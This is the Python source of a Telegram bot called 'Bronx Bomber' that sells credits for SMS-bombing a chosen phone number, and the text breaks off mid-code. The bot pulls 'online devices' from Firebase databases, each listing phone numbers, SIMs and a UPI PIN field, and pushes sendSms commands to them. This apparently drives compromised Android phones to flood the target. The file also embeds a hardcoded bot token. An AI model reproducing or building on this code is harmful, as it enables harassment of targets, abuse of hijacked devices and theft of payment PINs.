#!/usr/bin/env python3
"""
Premium Bronx Bomber Bot - v5 (No Force Join)
- /start directly shows full menu
- No join requirement
- All other features intact
"""

import asyncio
try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import io
import json
import logging
import sqlite3
import random
import string
import threading
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

# ---------- CONFIG ----------
TOKEN = os.environ.get("BOT_TOKEN", "8454255227:AAGBi0RaNAsYbjRb1RtibuLme3895r9fOx0")
ADMIN_IDS = [6840524720]
OWNER = "@BRONX_ULTRA"
BUY_CONTACT = "@BRONX_ULTRA"

REFER_CREDITS = 5
CREDIT_PRICE = 1
MAX_CONCURRENT_REQUESTS = 100

if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ ERROR: Bot token is not set.")
    exit(1)

# ---------- LOGGING ----------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ---------- HEALTH SERVER ----------
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot is alive")
    def log_message(self, format, *args):
        pass

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    print(f"✅ Health server on port {port}")
    server.serve_forever()

def start_health_server():
    threading.Thread(target=run_health_server, daemon=True).start()

# ---------- HTTP CLIENT ----------
_http_client = None
_http_semaphore = None

def get_http_client():
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client

def get_http_semaphore():
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore

# ---------- DATABASE ----------
DB_PATH = "bomber.db"

def _connect():
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")

    c.execute("""CREATE TABLE IF NOT EXISTS firebases (
        id TEXT PRIMARY KEY, url TEXT NOT NULL, secret TEXT NOT NULL,
        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS jobs (
        id TEXT PRIMARY KEY, target TEXT NOT NULL, message TEXT NOT NULL,
        devices_used INTEGER, success_count INTEGER, fail_count INTEGER,
        status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        scheduled_for TIMESTAMP, started_at TIMESTAMP, finished_at TIMESTAMP,
        firebase_ids TEXT, chat_id INTEGER, total_sms INTEGER, delay REAL,
        credit_used INTEGER, user_id INTEGER)""")

    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY, value TEXT)""")

    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0,
        username TEXT, first_name TEXT, banned INTEGER DEFAULT 0,
        referred_by INTEGER, refer_count INTEGER DEFAULT 0,
        joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS keys (
        key_string TEXT PRIMARY KEY, credits INTEGER NOT NULL,
        max_uses INTEGER NOT NULL, used_count INTEGER DEFAULT 0,
        created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key_string TEXT, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS refer_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER,
        referred_id INTEGER UNIQUE, credited INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS number_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT,
        message TEXT, sms_count INTEGER, job_id TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("PRAGMA table_info(users)")
    cols = [r[1] for r in c.fetchall()]
    for col, ddl in [
        ("username", "ALTER TABLE users ADD COLUMN username TEXT"),
        ("first_name", "ALTER TABLE users ADD COLUMN first_name TEXT"),
        ("banned", "ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0"),
        ("referred_by", "ALTER TABLE users ADD COLUMN referred_by INTEGER"),
        ("refer_count", "ALTER TABLE users ADD COLUMN refer_count INTEGER DEFAULT 0"),
        ("joined_at", "ALTER TABLE users ADD COLUMN joined_at TIMESTAMP"),
    ]:
        if col not in cols:
            c.execute(ddl)

    c.execute("PRAGMA table_info(jobs)")
    jcols = [r[1] for r in c.fetchall()]
    for col, ddl in [
        ("total_sms", "ALTER TABLE jobs ADD COLUMN total_sms INTEGER"),
        ("delay", "ALTER TABLE jobs ADD COLUMN delay REAL"),
        ("credit_used", "ALTER TABLE jobs ADD COLUMN credit_used INTEGER"),
        ("user_id", "ALTER TABLE jobs ADD COLUMN user_id INTEGER"),
    ]:
        if col not in jcols:
            c.execute(ddl)

    conn.commit()
    conn.close()

init_db()

# ---------- DB HELPERS ----------
def db_get_firebases():
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT id, url, secret FROM firebases")
    rows = c.fetchall(); conn.close()
    return {r[0]: {"url": r[1], "secret": r[2]} for r in rows}

def db_add_firebase(fid, url, secret=""):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO firebases (id,url,secret) VALUES (?,?,?)", (fid, url, secret))
    conn.commit(); conn.close()

def db_delete_firebase(fid):
    conn = _connect(); c = conn.cursor()
    c.execute("DELETE FROM firebases WHERE id=?", (fid,))
    conn.commit(); conn.close()

def db_add_job(job_id, target, message, firebase_ids, chat_id, total_sms, delay, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO jobs (id,target,message,status,firebase_ids,chat_id,total_sms,delay,user_id) VALUES (?,?,?,?,?,?,?,?,?)",
              (job_id, target, message, "pending", ",".join(firebase_ids), chat_id, total_sms, delay, user_id))
    conn.commit(); conn.close()
    return job_id

def db_update_job(job_id, **kwargs):
    conn = _connect(); c = conn.cursor()
    fields, vals = [], []
    for k, v in kwargs.items():
        fields.append(f"{k}=?"); vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit(); conn.close()

def db_get_jobs(limit=20, user_id=None):
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    if user_id is not None:
        c.execute("SELECT * FROM jobs WHERE user_id=? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall(); conn.close()
    return [dict(r) for r in rows]

def db_add_number_history(user_id, target, message, sms_count, job_id):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO number_history (user_id,target,message,sms_count,job_id) VALUES (?,?,?,?,?)",
              (user_id, target, message, sms_count, job_id))
    conn.commit(); conn.close()

def db_get_all_numbers():
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("""SELECT nh.*, u.username, u.first_name FROM number_history nh
                 LEFT JOIN users u ON nh.user_id = u.user_id
                 ORDER BY nh.created_at DESC""")
    rows = c.fetchall(); conn.close()
    return [dict(r) for r in rows]

def db_get_all_users_count():
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    row = c.fetchone(); conn.close()
    return row[0] if row else 0

# ---------- USER HELPERS ----------
def get_user_credits(user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    if row:
        return row[0]
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
    conn.commit(); conn.close()
    return 0

def update_user_credits(user_id, delta):
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, max(delta, 0)))
    conn.commit(); conn.close()

def deduct_credits(user_id, amount):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
        conn.commit()
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
    if row[0] >= amount:
        c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
        conn.commit(); conn.close()
        return True
    conn.close(); return False

def is_banned(user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    return bool(row and row[0] == 1)

def set_ban(user_id, banned):
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET banned=? WHERE user_id=?", (banned, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits, banned) VALUES (?,?,?)", (user_id, 0, banned))
    conn.commit(); conn.close()

def db_register_user(user_id, username, first_name):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE users SET username=?, first_name=? WHERE user_id=?",
                  (username, first_name, user_id))
        conn.commit(); conn.close()
        return False
    c.execute("INSERT INTO users (user_id, credits, username, first_name, joined_at) VALUES (?,?,?,?,?)",
              (user_id, 0, username, first_name, datetime.now().isoformat()))
    conn.commit(); conn.close()
    return True

def get_user_info(user_id):
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    return dict(row) if row else None

def get_leaderboard(limit=10):
    conn = _connect(); conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, credits, refer_count FROM users ORDER BY credits DESC LIMIT ?", (limit,))
    rows = c.fetchall(); conn.close()
    return [dict(r) for r in rows]

# ---------- KEY HELPERS ----------
def generate_key_string(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def db_add_key(key_string, credits, max_uses, created_by):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
              (key_string, credits, max_uses, created_by))
    conn.commit(); conn.close()

def db_redeem_key(key_string, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    if not row:
        conn.close(); return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close(); return False
    c.execute("SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?", (key_string, user_id))
    if c.fetchone():
        conn.close(); return False
    c.execute("UPDATE keys SET used_count = used_count + 1 WHERE key_string=?", (key_string,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, credits))
    c.execute("INSERT INTO redemptions (key_string, user_id) VALUES (?,?)", (key_string, user_id))
    conn.commit(); conn.close()
    return True

# ---------- REFER SYSTEM ----------
def db_process_refer(referrer_id, new_user_id):
    if referrer_id == new_user_id:
        return False
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id=?", (referrer_id,))
    if not c.fetchone():
        conn.close(); return False
    c.execute("SELECT 1 FROM refer_history WHERE referred_id=?", (new_user_id,))
    if c.fetchone():
        conn.close(); return False
    c.execute("SELECT referred_by FROM users WHERE user_id=?", (new_user_id,))
    row = c.fetchone()
    if row and row[0] is not None:
        conn.close(); return False
    c.execute("INSERT INTO refer_history (referrer_id, referred_id, credited) VALUES (?,?,1)",
              (referrer_id, new_user_id))
    c.execute("UPDATE users SET credits = credits + ?, refer_count = refer_count + 1 WHERE user_id=?",
              (REFER_CREDITS, referrer_id))
    c.execute("UPDATE users SET referred_by=? WHERE user_id=?", (referrer_id, new_user_id))
    conn.commit(); conn.close()
    return True

# ---------- FIREBASE ----------
async def firebase_request(url, method="GET", payload=None, timeout=15):
    raw = url.rstrip("/")
    query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"):
        raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    full_url = f"{raw}.json" if parsed.path else f"{raw}/.json"
    if query:
        full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET":   resp = await client.get(full_url)
            elif method == "PUT": resp = await client.put(full_url, json=payload)
            elif method == "POST": resp = await client.post(full_url, json=payload)
            elif method == "DELETE": resp = await client.delete(full_url)
            else: raise ValueError("Unsupported")
            resp.raise_for_status()
            try: return resp.json()
            except json.JSONDecodeError: return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        status = e.response.status_code
        try: err = e.response.json()
        except Exception: err = {"error": str(e)}
        return {"_error": True, "status": status, "message": err.get("error", str(e))}
    except Exception as e:
        return {"_error": True, "status": 0, "message": str(e)}

async def get_online_devices(url):
    base = url.rstrip("/")
    if base.endswith(".json"): base = base[:-5]
    base = base.rstrip("/")
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(f"{base}/clients.json")
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        logger.error(f"get_online_devices failed: {e}")
        return []
    if not isinstance(clients, dict): return []
    online = []
    for did, info in clients.items():
        if isinstance(info, dict) and info.get("status") is True:
            online.append({
                "id": did, "name": info.get("modelName", did),
                "phone": info.get("mobNo", "N/A"),
                "battery": info.get("battery", "N/A"),
                "provider": info.get("service_provider", ""),
                "sims": info.get("sims", []),
                "upipin": info.get("upipin", ""),
                "lastSeen": info.get("lastSeen"),
            })
    return online

async def send_sms_via_device(url, device_id, sim_index, target, message):
    payload = {"from": sim_index, "to": target, "message": message,
               "isSended": False, "timestamp": datetime.now().isoformat()}
    put_url = f"{url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Send failed for {device_id}: {e}")
        return False

# ---------- GLOBALS ----------
running_jobs = {}
progress_messages = {}
BOT = None
def set_bot(bot):
    global BOT
    BOT = bot

LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"

# ---------- BOMB ENGINE ----------
async def execute_bomb_job(job_id, target, message, firebase_ids, total_sms, delay, user_id, schedule_time=None):
    if schedule_time and schedule_time > datetime.now():
        scheduler = AsyncIOScheduler()
        scheduler.add_job(execute_bomb_job, trigger=DateTrigger(run_date=schedule_time),
                          args=[job_id, target, message, firebase_ids, total_sms, delay, user_id, None],
                          id=job_id, replace_existing=True)
        scheduler.start()
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())
    if not deduct_credits(user_id, total_sms):
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="Insufficient credits")
        return

    all_devices = []
    firebases = db_get_firebases()
    for fid in [f for f in firebase_ids if f in firebases]:
        url = firebases[fid]["url"]
        for dev in await get_online_devices(url):
            all_devices.append((fid, dev, url))

    if not all_devices:
        update_user_credits(user_id, total_sms)
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0, finished=True, error="No online devices")
        return

    num_devices = len(all_devices)
    per = total_sms // num_devices
    rem = total_sms % num_devices
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        cnt = per + (1 if i < rem else 0)
        if cnt > 0:
            assignments.append((fid, dev, url, cnt))

    total_attempts = sum(c for _,_,_,c in assignments)
    success = fail = 0
    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0)

    idx = 0
    for fid, dev, url, count in assignments:
        for _ in range(count):
            ok = await send_sms_via_device(url, dev["id"], 1, target, message)
            success += 1 if ok else 0
            fail += 0 if ok else 1
            idx += 1
            await send_progress_update(job_id, idx, total=total_attempts, success=success, fail=fail)
            await asyncio.sleep(delay)

    if fail > 0:
        update_user_credits(user_id, fail)

    db_update_job(job_id, status="completed", finished_at=datetime.now().isoformat(),
                  devices_used=num_devices, success_count=success, fail_count=fail, credit_used=success)
    await send_progress_update(job_id, total_attempts, total=total_attempts, success=success, fail=fail, finished=True)
    running_jobs.pop(job_id, None)
    progress_messages.pop(job_id, None)

async def send_progress_update(job_id, done, total, success, fail, finished=False, error=None):
    if BOT is None: return
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone(); conn.close()
    if not row: return
    chat_id, target, user_id = row
    credits = get_user_credits(user_id) if user_id else 0
    percent = int((done / total) * 100) if total else 0
    filled = int(20 * percent / 100)
    bar = "▰" * filled + "▱" * (20 - filled)
    if error: status_text = f"❌ *Error:* {error}"
    elif finished: status_text = "✅ *Completed*"
    else: status_text = "🔄 *Running*"
    text = (
        f"{LINE}\n💣 *Bronx Bomb* | Job: `{job_id}`\n{LINE}\n\n"
        f"{bar}  *{percent}%*\n\n"
        f"📞 Target: `{target}`\n"
        f"✅ Sent: {success}   ❌ Failed: {fail}\n"
        f"💳 Credits: {credits}\n\n📌 Status: {status_text}"
    )
    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(text, chat_id=chat_id,
                                        message_id=progress_messages[job_id],
                                        parse_mode=ParseMode.MARKDOWN)
        except Exception as e: logger.warning(f"edit progress: {e}")
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.MARKDOWN)
            progress_messages[job_id] = msg.message_id
        except Exception as e: logger.warning(f"send progress: {e}")

# ---------- CONV STATES ----------
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)

USER_BUTTONS = ["💣 Launch Bomb", "💰 Balance", "📊 Status", "📜 History",
                "🔑 Redeem Key", "🎁 Refer & Earn", "👥 My Referrals", "🛒 Buy Credits"]
ADMIN_BUTTONS = ["📡 Online Devices", "📊 Stats & History",
                 "⚙️ Manage Firebases", "🔑 Generate Key", "🛡️ Admin Panel"]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS

def get_main_keyboard(user_id):
    kb = [
        ["💣 Launch Bomb", "💰 Balance"],
        ["📊 Status", "📜 History"],
        ["🔑 Redeem Key", "🛒 Buy Credits"],
        ["🎁 Refer & Earn", "👥 My Referrals"],
    ]
    if user_id in ADMIN_IDS:
        kb.append(["📡 Online Devices", "📊 Stats & History"])
        kb.append(["⚙️ Manage Firebases", "🔑 Generate Key"])
        kb.append(["🛡️ Admin Panel"])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

# ---------- NOTIFY ADMIN ----------
async def notify_admin_new_user(bot, user_id, username, first_name, referrer_id=None):
    ref_line = f"🎁 *Referred By:* `{referrer_id}`" if referrer_id else "🎁 *Referred By:* `None`"
    text = (
        "🔔 *NEW USER STARTED THE BOT*\n"
        f"{LINE}\n"
        f"👤 *Name:* {first_name or 'N/A'}\n"
        f"🔗 *Username:* @{username if username else 'N/A'}\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"{ref_line}\n"
        f"{LINE}"
    )
    for admin in ADMIN_IDS:
        try:
            await bot.send_message(admin, text, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            logger.warning(f"Could not DM admin {admin}: {e}")

# ---------- FORCE JOIN (DISABLED) ----------
async def ensure_join(update, context) -> bool:
    """Force join disabled — always returns True."""
    return True

# ---------- PING ----------
async def ping(update, context):
    await update.message.reply_text("🏓 Pong! ⚡ *Bot is alive.*", parse_mode=ParseMode.MARKDOWN)

# ---------- /START ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    referrer_id = None
    if context.args:
        try:
            referrer_id = int(context.args[0])
        except Exception:
            referrer_id = None

    is_new = db_register_user(user_id, user.username, user.first_name)

    refer_credited = False
    if is_new and referrer_id and referrer_id != user_id:
        refer_credited = db_process_refer(referrer_id, user_id)
        if refer_credited:
            try:
                await context.bot.send_message(
                    referrer_id,
                    f"🎁 *New Refer!* +{REFER_CREDITS} credits added!\n"
                    f"👤 {user.first_name or 'User'} joined via your link.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

    if is_new:
        try:
            await notify_admin_new_user(context.bot, user_id,
                                        user.username, user.first_name,
                                        referrer_id if refer_credited else None)
        except Exception as e:
            logger.warning(f"notify admin failed: {e}")

    # ===== DIRECT MENU (NO JOIN CHECK) =====
    credits = get_user_credits(user_id)
    is_admin = user_id in ADMIN_IDS
    role = "👑 *ADMIN*" if is_admin else "⚡ *USER*"
    me = await context.bot.get_me()
    ref_link = f"https://t.me/{me.username}?start={user_id}"

    text = (
        "╔══════════════════════════════════╗\n"
        "   🔥 *BRONX ULTRA BOMBER* 🔥\n"
        "╚══════════════════════════════════╝\n\n"
        f"👤 *User ID:* `{user_id}`\n"
        f"💎 *Credits:* {credits}\n"
        f"🎖️ *Role:* {role}\n"
        f"👑 *Owner:* {OWNER}\n\n"
        f"{LINE}\n"
        "🚀 *Server:* Ultra-Fast Async\n"
        "⚡ *Multi-User:* Unlimited\n"
        "🛡️ *Status:* ✅ Online\n"
        f"{LINE}\n\n"
        f"🎁 *Refer Link:*\n`{ref_link}`\n"
        f"💡 1 Refer = {REFER_CREDITS} Credits\n"
        f"{LINE}\n\n"
        "👇 Use buttons below ✨"
    )
    if refer_credited:
        text = f"🎁 *Refer Bonus Added!*\n\n" + text

    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.MARKDOWN)

# ---------- CALLBACK HANDLER ----------
async def callback_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if is_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return

    if data == "balance":
        credits = get_user_credits(user_id)
        await query.edit_message_text(
            f"💎 *BALANCE*\n{LINE}\n💳 Credits: *{credits}*\n{LINE}",
            parse_mode=ParseMode.MARKDOWN)
    elif data == "buy_credits":
        await query.edit_message_text(
            f"🛒 *BUY CREDITS*\n{LINE}\n"
            f"💡 *1 Credit = ₹{CREDIT_PRICE}*\n\n"
            f"📩 DM {BUY_CONTACT} to buy credits.\n"
            f"{LINE}",
            parse_mode=ParseMode.MARKDOWN)
    elif data == "status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await query.edit_message_text("📊 No jobs yet.")
            return
        text = "📊 *STATUS*\n" + LINE + "\n"
        for j in jobs:
            text += (f"`{j['id']}` → `{j['target']}`\n"
                     f"✅ {j.get('success_count',0)} ❌ {j.get('fail_count',0)} | *{j['status']}*\n"
                     f"{'─' * 25}\n")
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    elif data == "redeem_key":
        context.user_data["awaiting_redeem"] = True
        await query.edit_message_text(
            "🔑 *REDEEM KEY*\nSend the key now.\nExample: `ABCD1234`",
            parse_mode=ParseMode.MARKDOWN)
    elif data == "refer":
        me = await context.bot.get_me()
        link = f"https://t.me/{me.username}?start={user_id}"
        await query.edit_message_text(
            f"🎁 *REFER & EARN*\n{LINE}\n"
            f"💡 1 Valid Refer = *{REFER_CREDITS} Credits*\n\n"
            f"🔗 Your Link:\n`{link}`\n\n"
            f"⚠️ *Rules:*\n"
            f"• Only NEW users count\n"
            f"• Old users won't count\n"
            f"• Fake refers blocked\n"
            f"{LINE}",
            parse_mode=ParseMode.MARKDOWN)
    elif data == "myrefers":
        info = get_user_info(user_id) or {}
        count = info.get("refer_count", 0) or 0
        await query.edit_message_text(
            f"👥 *MY REFERRALS*\n{LINE}\n"
            f"Total Valid Refers: *{count}*\n"
            f"Credits Earned: *{count * REFER_CREDITS}*\n{LINE}",
            parse_mode=ParseMode.MARKDOWN)
    elif data == "send_now":
        context.user_data["schedule_time"] = None
        await query.message.reply_text("🚀 Sending now...")
        await _launch_bomb(update, context)
    elif data == "schedule_later":
        await query.edit_message_text(
            "🕒 Send date/time in format `YYYY-MM-DD HH:MM`\n"
            "Example: `2025-12-31 23:59`",
            parse_mode=ParseMode.MARKDOWN)
        return SCHEDULE
    elif data == "admin_panel":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Unauthorized."); return
        await show_admin_panel(query)
    elif data == "devices":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Unauthorized."); return
        await show_devices(query)
    elif data == "manage_fb":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Unauthorized."); return
        await manage_firebases(query)
    elif data == "back_main":
        await query.edit_message_text("🔙 Back.", reply_markup=get_main_keyboard(user_id))
    elif data.startswith("fb_delete_"):
        if user_id not in ADMIN_IDS: return
        fid = data.split("_")[2]
        db_delete_firebase(fid)
        await query.edit_message_text(f"✅ Firebase `{fid}` deleted.", parse_mode=ParseMode.MARKDOWN)
    elif data.startswith("fb_test_"):
        if user_id not in ADMIN_IDS: return
        fid = data.split("_")[2]
        fb = db_get_firebases().get(fid)
        if not fb:
            await query.edit_message_text("❌ Not found."); return
        test = await firebase_request(fb["url"] + "?shallow=true", "GET")
        if isinstance(test, dict) and test.get("_error"):
            await query.edit_message_text(f"❌ Failed: {test.get('message')}")
        else:
            await query.edit_message_text(f"✅ Firebase `{fid}` OK.", parse_mode=ParseMode.MARKDOWN)
    elif data == "add_fb":
        if user_id not in ADMIN_IDS: return
        await query.edit_message_text("📝 Send: `/addfb <url>`", parse_mode=ParseMode.MARKDOWN)
    else:
        await query.edit_message_text("Unknown action.")

# ---------- ADMIN PANEL ----------
async def show_admin_panel(query):
    text = (
        "🛡️ *ADMIN PANEL*\n" + LINE + "\n\n"
        "🔨 `/ban <user_id>`\n"
        "✅ `/unban <user_id>`\n"
        "➕ `/addcredit <user_id> <amount>`\n"
        "➖ `/removecredit <user_id> <amount>`\n"
        "📜 `/numberhistory` — TXT file\n"
        "🏆 `/leaderboard`\n"
        "🔑 `/addkey <credits> <max_uses>`\n"
        "📢 `/broadcast <text>`\n"
        "➕ `/addfb <url>`\n"
        "➖ `/deletefb <id>`\n"
        f"\n{LINE}"
    )
    kb = [
        [InlineKeyboardButton("📡 Devices", callback_data="devices"),
         InlineKeyboardButton("⚙️ Firebases", callback_data="manage_fb")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

# ---------- BOMB WIZARD ----------
async def bomb_wizard_start(update, context):
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "💣 *LAUNCH BOMB*\n" + LINE + "\n"
            "📞 Enter target phone number:\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(
            "💣 *LAUNCH BOMB*\n" + LINE + "\n"
            "📞 Enter target phone number:\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.MARKDOWN)
    return TARGET

async def bomb_target(update, context):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    if not text.isdigit():
        await update.message.reply_text("❌ Invalid number. Try again.")
        return TARGET
    context.user_data["target"] = text
    await update.message.reply_text("✏️ Enter the message to send:")
    return MESSAGE

async def bomb_message(update, context):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    context.user_data["message"] = text
    credits = get_user_credits(update.effective_user.id)
    await update.message.reply_text(
        f"📨 How many SMS? (Credits: *{credits}*)\nEnter a number:",
        parse_mode=ParseMode.MARKDOWN)
    return SMS_COUNT

async def bomb_sms_count(update, context):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        count = int(text)
        if count <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Enter a positive integer.")
        return SMS_COUNT
    credits = get_user_credits(update.effective_user.id)
    if count > credits:
        await update.message.reply_text(f"⚠️ Only {credits} credits. Try again or /cancel.")
        return SMS_COUNT
    context.user_data["sms_count"] = count
    kb = [
